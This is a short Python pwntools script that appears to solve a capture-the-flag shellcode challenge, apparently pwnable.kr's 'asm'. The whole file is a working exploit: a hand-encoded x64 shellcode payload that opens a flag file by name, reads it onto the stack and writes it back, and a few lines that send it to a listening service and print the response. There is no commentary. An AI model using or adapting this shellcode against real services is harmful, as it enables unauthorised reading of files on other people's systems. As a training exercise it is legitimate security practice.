from pwn import *

payload = "\xbf\x65\x40\x41\x41\x67\x88\x9f\xe7\x00\x00\x00\x40\xb6\x00\xb0\x02\x0f\x05\x48\x31\xff\x40\x88\xc7\x48\x83\xec\x3c\x48\x89\xe6\xb2\x3c\x30\xc0\x0f\x05\x48\x31\xff\x40\xb7\x01\xb0\x01\x0f\x05\x48\x31\xff\xb0\x3c\x0f\x05\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67"

p = remote('0.0.0.0', 9026)
p.recvuntil("give me your x64 shellcode: ")
p.sendline(payload)
print p.recv()